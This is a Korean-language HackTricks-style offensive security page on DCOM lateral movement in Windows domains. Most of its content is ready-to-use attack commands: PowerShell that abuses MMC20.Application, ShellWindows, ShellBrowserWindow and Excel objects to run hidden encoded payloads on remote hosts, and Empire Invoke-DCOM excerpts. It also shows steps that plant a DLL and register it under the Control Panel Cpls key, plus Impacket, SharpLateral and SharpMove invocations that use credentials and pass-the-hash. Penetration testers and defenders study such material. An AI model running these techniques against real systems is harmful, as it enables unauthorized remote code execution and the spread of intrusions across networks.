# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement은 서비스를 생성하거나 scheduled task를 생성하는 대신 RPC/DCOM을 통해 노출된 기존 COM 서버를 재사용하므로 매력적입니다. 실제로 이는 초기 연결이 일반적으로 TCP/135에서 시작한 다음 동적으로 할당된 높은 RPC 포트로 이동한다는 의미입니다.

## 사전 요구 사항 및 주의 사항

- 일반적으로 대상에 대한 local administrator 컨텍스트가 필요하며, 원격 COM 서버에서 remote launch/activation을 허용해야 합니다.
- **2023년 3월 14일**부터 Microsoft는 지원되는 시스템에 DCOM hardening을 적용합니다. 낮은 activation authentication level을 요청하는 이전 client는 최소한 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`로 협상하지 않으면 실패할 수 있습니다. 최신 Windows client는 일반적으로 자동으로 상향 조정되므로 현재 tooling은 대개 계속 작동합니다.<sup>[[3]](#references)</sup>
- 수동 또는 scripted DCOM execution에는 일반적으로 TCP/135와 대상의 dynamic RPC port range가 필요합니다. Impacket의 `dcomexec.py`를 사용하고 command output을 반환받으려면 일반적으로 `ADMIN$`(또는 쓰기/읽기가 가능한 다른 share)에 대한 SMB access도 필요합니다.
- RPC/DCOM은 작동하지만 SMB가 차단된 경우에도 `dcomexec.py -nooutput`은 blind execution에 유용할 수 있습니다.

빠른 확인:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

이 technique에 대한 자세한 내용은 [MMC20.Application 원문 게시물](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)을 참조하세요.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects는 objects와 네트워크 기반 상호 작용을 수행할 수 있는 흥미로운 기능을 제공합니다. Microsoft는 DCOM과 Component Object Model (COM)에 대한 포괄적인 문서를 제공하며, [DCOM 문서는 여기](https://msdn.microsoft.com/en-us/library/cc226801.aspx), [COM 문서는 여기](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)에서 확인할 수 있습니다. 다음 PowerShell command를 사용하여 DCOM applications 목록을 가져올 수 있습니다:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object인 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)은 MMC snap-in 작업을 scripting할 수 있도록 합니다. 특히 이 object에는 `Document.ActiveView` 아래에 `ExecuteShellCommand` method가 포함되어 있습니다. 이 method에 대한 자세한 내용은 [여기](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)에서 확인할 수 있습니다. 다음을 실행하여 확인합니다:<sup>[[6]](#references)</sup>

이 기능을 사용하면 DCOM application을 통해 network에서 commands를 실행할 수 있습니다. admin으로 DCOM과 원격으로 상호작용하려면 다음과 같이 PowerShell을 사용할 수 있습니다:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
이 명령은 DCOM 애플리케이션에 연결하고 COM object의 인스턴스를 반환합니다. 그런 다음 ExecuteShellCommand 메서드를 호출하여 원격 호스트에서 프로세스를 실행할 수 있습니다. 프로세스는 다음 단계로 진행됩니다:

메서드 확인:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE 획득:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
마지막 인수는 창 스타일입니다. `7`은 창을 최소화된 상태로 유지합니다. 실제 동작 측면에서 MMC 기반 execution은 일반적으로 원격 `mmc.exe` process가 payload를 spawn하도록 하며, 이는 아래의 Explorer 기반 objects와 다릅니다.

## ShellWindows & ShellBrowserWindow

**이 technique에 대한 자세한 내용은 original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object에는 명시적인 "LaunchPermissions"가 없으며, Administrators의 access를 허용하는 permissions로 default 설정되는 것으로 확인되었습니다. 자세한 내용은 [여기](https://twitter.com/tiraniddo/status/817532039771525120)의 thread에서 확인할 수 있으며, 명시적인 Launch Permission이 없는 objects를 filtering하기 위해 [@tiraniddo](https://twitter.com/tiraniddo)의 OleView .NET을 사용하는 것이 권장됩니다.

두 개의 특정 objects인 `ShellBrowserWindow`와 `ShellWindows`는 명시적인 Launch Permissions가 없기 때문에 주목받았습니다. `HKCR:\AppID\{guid}` 아래에 `LaunchPermission` registry entry가 없다는 것은 명시적인 permissions가 없음을 의미합니다.

`MMC20.Application`과 비교하면, 이러한 objects는 remote host에서 command가 `mmc.exe` 대신 일반적으로 `explorer.exe`의 child로 실행되므로 OPSEC 관점에서 더 조용한 경우가 많습니다.

### ShellWindows

ProgID가 없는 `ShellWindows`의 경우, .NET methods인 `Type.GetTypeFromCLSID`와 `Activator.CreateInstance`를 사용하여 해당 AppID로 object를 instantiate할 수 있습니다. 이 process에서는 OleView .NET을 사용하여 `ShellWindows`의 CLSID를 가져옵니다. Instantiate한 후에는 `WindowsShell.Item` method를 통해 interaction할 수 있으며, 이를 통해 `Document.Application.ShellExecute`와 같은 method invocation이 가능합니다.

object를 instantiate하고 원격으로 commands를 실행하는 PowerShell commands 예시는 다음과 같습니다:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow`는 유사하지만, CLSID를 통해 직접 인스턴스화한 후 `Document.Application.ShellExecute`로 pivot할 수 있습니다:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects를 이용한 Lateral Movement

DCOM Excel objects를 악용하여 Lateral Movement를 수행할 수 있습니다. 자세한 내용은 [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)의 DCOM을 통한 Lateral Movement를 위해 Excel DDE를 활용하는 방법에 대한 글을 읽어보는 것이 좋습니다.<sup>[[5]](#references)</sup>

Empire project는 DCOM objects를 조작하여 Excel을 이용한 원격 코드 실행(RCE)을 수행하는 방법을 보여주는 PowerShell script를 제공합니다. 다음은 [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)에 있는 script의 일부로, Excel을 악용하여 RCE를 수행하는 여러 방법을 보여줍니다:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
최근 연구에서는 `Excel.Application`의 `ActivateMicrosoftApp()` 메서드를 통해 이 영역이 확장되었습니다. 핵심 아이디어는 Excel이 시스템 `PATH`를 검색하여 FoxPro, Schedule Plus 또는 Project와 같은 레거시 Microsoft 애플리케이션을 실행할 수 있다는 것입니다. 공격자가 대상의 `PATH`에 포함된 쓰기 가능한 위치에 이러한 예상 이름 중 하나를 가진 payload를 배치할 수 있다면 Excel이 이를 실행합니다.<sup>[[4]](#references)</sup>

이 변형에 필요한 조건:

- 대상의 Local admin 권한
- 대상에 Excel 설치
- 대상의 `PATH`에 포함된 쓰기 가능한 디렉터리에 payload를 작성할 수 있는 권한

FoxPro 조회(`FOXPROW.exe`)를 악용하는 실제 예시:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
공격 호스트에 로컬 `Excel.Application` ProgID가 등록되어 있지 않다면, 대신 CLSID를 사용하여 원격 객체를 인스턴스화합니다:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
실제 악용 사례에서 확인된 값:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 등록된 Control Panel DLL 로드

`COpenControlPanel` 클래스(CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`)는 `IOpenControlPanel`(IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`)을 노출합니다. 이 클래스의 `Open()` 메서드는 `Control Panel\Cpls` 키에 등록된 Control Panel DLL을 원격 `dllhost.exe`가 로드하도록 합니다. 테스트한 시스템에서 이 클래스에는 명시적인 launch/access permissions가 없었으므로 기본 DCOM 정책을 상속합니다(일반적으로 remote activation에는 administrator 권한이 필요함). 임의의 item name만으로도 `Open()`이 등록된 DLL을 처리하도록 할 수 있으며, payload에는 `.cpl` extension이 필요하지 않지만 올바른 architecture의 유효한 DLL이어야 합니다.<sup>[[7]](#references)</sup>

이 primitive는 **stage-and-trigger** 방식이며 command-only execution이 아닙니다. 먼저 target에 DLL을 copy하고 해당 DLL을 가리키는 `REG_EXPAND_SZ` value를 생성한 다음, DCOM을 통해 object를 activate해야 합니다. 예를 들어 administrative Windows context에서:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
공개 [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client는 Impacket를 사용해 문서화되지 않은 DCOM 호출을 구현합니다. 임의의 Control Panel 항목 이름을 제공하는 것만으로도 충분하며, `dllhost.exe`가 DLL을 로드했더라도 client에서 RPC 오류를 보고할 수 있습니다.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
운영 측면에서 이 경로는 파일 쓰기 채널과 원격 레지스트리 액세스도 필요하므로 `MMC20`/`ShellWindows`보다 더 시끄럽습니다. 또한 나중에 Control Panel을 열 때 동일한 항목을 다시 로드할 수 있으므로 persistence side effect가 발생합니다. 실행 후 해당 값을 제거하고, 비정상적인 DLL 로드와 함께 예상치 못한 `Control Panel\Cpls` 값을 찾아보세요.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Lateral Movement을 위한 Automation Tools

이러한 techniques를 자동화하기 위해 두 가지 tools가 강조됩니다:

- **Invoke-DCOM.ps1**: Empire project에서 제공하는 PowerShell script로, remote machines에서 code를 실행하기 위한 다양한 methods의 invocation을 간소화합니다. 이 script는 Empire GitHub repository에서 확인할 수 있습니다.

- **SharpLateral**: remote에서 code를 실행하기 위해 설계된 tool이며, 다음 command와 함께 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 자동화 도구

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)을 사용하면 주석 처리된 모든 방식으로 다른 시스템에서 code를 쉽게 실행할 수 있습니다.
- Impacket의 `dcomexec.py`를 사용하면 DCOM을 통해 원격 시스템에서 명령을 실행할 수 있습니다. 현재 빌드는 `ShellWindows`, `ShellBrowserWindow`, `MMC20`을 지원하며 기본값은 `ShellWindows`입니다.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- 다음과 같이 [**SharpLateral**](https://github.com/mertdas/SharpLateral)도 사용할 수 있습니다:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove)를 사용할 수도 있습니다
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Object를 사용한 Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM을 통한 Lateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass 변경 사항 관리 (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application의 강력한 기능 악용](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM을 통한 Lateral Movement를 위한 Excel DDE 활용](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [원격 명령 실행을 위한 DCOM objects 사용](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
